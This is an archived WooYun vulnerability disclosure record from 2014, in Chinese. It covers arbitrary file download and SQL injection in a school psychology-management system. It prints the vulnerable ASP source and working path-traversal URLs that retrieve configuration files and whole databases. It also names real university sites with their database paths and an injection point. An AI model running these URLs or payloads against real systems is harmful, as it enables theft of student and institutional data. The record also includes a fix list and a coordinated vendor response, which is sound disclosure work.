{"id": 2148, "wybug_id": "wooyun-2014-060864", "wybug_title": "某通用型管理系统任意文件下载到拖库到SQL注入挖掘", "wybug_corp": "cncert国家互联网应急中心", "wybug_author": "xfkxfk", "wybug_date": "2014-05-16 14:10", "wybug_open_date": "2014-08-14 14:12", "wybug_type": "任意文件遍历/下载", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["第三方不可信程序", "任意文件读取利用", "文件操作参数未加过滤", "文件操作不当", "源码审核", "文件操作参数未过滤"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-05-16：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-05-21：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-05-24：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-07-15：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-07-25：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-08-04：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-08-14：\t细节向公众公开  简要描述： 某通用型管理系统任意文件下载漏洞 详细说明：  北京心海导航科技有限公司：http://www.xinhaisoft.com/心海心理管理系统——中国心理测量第一品牌客户列表：http://www.xinhaisoft.com/CustomerList.aspx大部分都是学校用户和教委用户，还是很多的Google关键字：技术支持：http://www.xinhaisoft.com\n\n任意文件下载漏洞：admin文件夹下的程序文件fileopen.asp文件，未对身份权限验证和传递的参数过滤导致任意下载漏洞。\nEXP：http://www.xxx.com/xxx/admin/fileopen.asp?filename=../index.asphttp://www.xxx.com/admin/fileopen.asp?filename=../index.asp\n下载代码后分析：\n<%@LANGUAGE=\"VBSCRIPT\" CODEPAGE=\"936\"%><%Option Explicit%><%Dim Filename, s, fs, fl, Filesize'取得文件名参数Filename = Trim(Request.Form(\"filename\"))If Filename = \"\" Then Filename = Trim(Request.QueryString(\"filename\"))If Filename = \"\" Then Call ShowMessage(\"对不起，文件名为空！\")'转为绝对路径If Mid(Filename, 2, 2) = \":\\\" Then Filename = Replace(Filename, \"/\", \"\\\") Else Filename = Server.MapPath(Filename)'检查文件是否存在Set fs = Server.CreateObject(\"Scripting.FileSystemObject\")If Not fs.FileExists(Filename) Then Call ShowMessage(\"对不起，指定文件不存在！\")'取得文件大小Set fl = fs.GetFile(Filename)Filesize = fl.Size'销毁FSO对象Set fl = NothingSet fs = Nothing'清理缓存Response.Buffer = TrueResponse.Clear'创建Stream对象Set s = Server.CreateObject(\"ADODB.Stream\")s.Open'设置为二进制方式s.Type = 1'容错On Error Resume Next'装载文件s.LoadFromFile (Filename)If Err Then Call ShowMessage(\"装载指定文件出现未知错误！\")'向浏览器输出头部Response.AddHeader \"Content-Disposition\", \"attachment; filename=\" & Mid(Filename, InStrRev(Filename, \"\\\") + 1)Response.AddHeader \"Content-Length\", Filesize'Response.CharSet=\"UTF-8\"Response.ContentType = \"application/octet-stream\"'向浏览器输出文件Response.BinaryWrite s.ReadResponse.Flush'销毁对象s.Close: Set s = Nothing'在本页输出提示信息Sub ShowMessage(msg)  Response.Write \"<br><div align='center'><div style='color:red; font-weight:bold; text-align:center; border:1px solid #CCCCCC; background-color:#E8E8E8; padding:4px 2px 2px; width:300px; font-size:12px'>\" & msg & \"</div></div><br>\"  Response.EndEnd Sub%>\nFilename = Trim(Request.Form(\"filename\"))直接传入到下载的文件路径中，位置任何处理，导致漏洞产生。数据库下载：下载此系统的view.asp或者list.asp文件：http://www.xxx.com/xxx/admin/fileopen.asp?filename=../article/list.asphttp://www.xxx.com/admin/fileopen.asp?filename=../article/list.asp\n<%@LANGUAGE=\"VBSCRIPT\" CODEPAGE=\"936\"%><%Option Explicit%><!--#include file=\"../inc/conn.asp\" --><!--#include file=\"../inc/Function.asp\" --><!--#include file=\"../inc/SplitPage.inc\" --><%dim typeid,typename,i,wordtypeid=Request.QueryString(\"typeid\")word=CheckStr(Request.QueryString(\"word\"))%>......\n在下载inc/conn.asp文件http://www.xxx.com/xxx/admin/fileopen.asp?filename=../inc/conn.asphttp://www.xxx.com/admin/fileopen.asp?filename=../inc/conn.asp\n<!--#include file=\"SETTINGS.ASP\" --><%dim con,rs,sqlOn Error Resume Nextset con=Server.CreateObject(\"XINHAI.Database\")if err then response.redirect \"error.asp?errstr=\" & Server.urlencode(\"您可能尚未安装或者安装没有完成，请点击这里进行[<a href='setup.htm'>安装</a>]。\")On Error Goto 0con.Path=pasdbpathcon.OpenDatabaseSub conBatchExecute(str)\tcon.execute(str)End SubFunction getFenyeRs(str)\tset getFenyeRs=con.execute(str,2)End Function%>\n在下载SETTINGS.ASP文件：http://www.xxx.com/xxx/admin/fileopen.asp?filename=../inc/SETTINGS.ASPhttp://www.xxx.com/admin/fileopen.asp?filename=../inc/SETTINGS.ASP\n<%'==== 设置数据库文件所在的路径 ====Const pasdbpath=\"D:\\网站\\xinhai\\db\\356ghbhhi92sxvgjn9.asp\"%>\n至此找到了数据库文件，可以直接下载数据库文件了：http://www.xxx.com/admin/fileopen.asp?filename=../db/356ghbhhi92sxvgjn9.asp综上，我们只要直接下载SETTINGS.ASP文件即可，即可知道数据库的文件信息了。SQL注入漏洞：我们下载sixiangEdu.asp\n<div class=\"subright\">\t\t\t<%\t\t\t\ttypeid=request.QueryString(\"typeid\")\t\t\t\tIf typeid=\"\" Then typeid=12            %>\t\t\t<!--#include file=\"newslist.asp\"-->        </div>\n再继续下载newslist.asp\n<div class=\"newslist\"><%'============================================'头部信息'============================================if typeid=\"\" Then\tresponse.Redirect \"error2.html\"End Ifsqlstr=\"Select typeName From Types Where typeid=\"&typeidset rs=dbconn.Execute(sqlstr)headname=rs(\"typeName\")rs.closeSet rs=nothing%>......<div style=\"width:540px; border:0px solid #000;\"><table border=\"0\" cellspacing=\"0\" cellpadding=\"0\" width=\"540\"><%\tsqlstr=\"select * from News where checkked=1 And typeid=\"&typeid&\" order by NewsId desc\"\t'response.Write sqlstr\tset rs=Server.CreateObject(\"ADODB.RecordSet\")\trs.open sqlstr,dbconn,1,1\tIf rs.EOF Then%>\t<tr><td colspan=\"3\">没有记录</td></tr>\n看到了typeid没有过滤直接进入SQL语句，导致注入了。   漏洞证明：  任意文件下载：以湖南工学院为例：http://www2.hnit.edu.cn/xinhai/下载SETTINGS.ASP文件：http://www2.hnit.edu.cn/xinhai/admin/fileopen.asp?filename=../inc/SETTINGS.ASP\n\n数据库下载：以湖南工学院为例：http://www2.hnit.edu.cn/xinhai/http://www2.hnit.edu.cn/xinhai/admin/fileopen.asp?filename=../db/356ghbhhi92sxvgjn9.asp\n\n500MB数据库有木有还有吉林工商学院的：http://xinli.jlbtc.edu.cn/admin/fileopen.asp?filename=../db/dlHU8VlZ1Xj46doBk2Aq1.aspSQL注入：以安徽大学为例：http://www.xsc.ahu.edu.cn/下载文件：http://www.xsc.ahu.edu.cn/xlzx/admin/fileopen.asp?filename=../../newslist.asp注入点：http://www.xsc.ahu.edu.cn/sixiangEdu.asp?typeid=12\n\n安徽大学的数据库：D:\\webroot\\xsc\\xlzx\\db\\pas.asp\"   修复方案：  1、控制后台文件权限2、处理下载的文件类型3、过滤用户输入   版权声明：转载请注明来源 xfkxfk@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：14  确认时间：2014-05-21 08:55 厂商回复： CNVD确认并复现所述多个实例情况（验证过程由上海交通大学网络信息中心协助完成），已经将通报转报给教育网应急组织赛尔网络公司，并抄报CCERT。同时CNVD已经将通报转报给北京心海导航科技有限公司，QQ邮件：。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-05-16 14:14 |    \t\tU神 \t\t\t( 核心白帽子 |\t\t\t        Rank:1285 漏洞数:142        | 感谢乌云，知恩不忘，其实我一直都在乌云默...)\t\t \n  为何你的每次都审核    \n     2014-05-16 14:39 |    \t\t光刃 \t\t\t( 普通白帽子  |\t\t\t        Rank:200 漏洞数:24        | 萝卜白菜保平安)\t\t \n  渗透大牛！    \n     2014-05-16 16:04 |    \t\ts2ck \t\t\t( 路人 |\t\t\t        Rank:5 漏洞数:1        | 好好学习 天天向上)\t\t \n  @U神 不会是那个乾豪吧，    \n     2014-06-10 19:14 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  嘿嘿给力    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 14, "Ranks": null}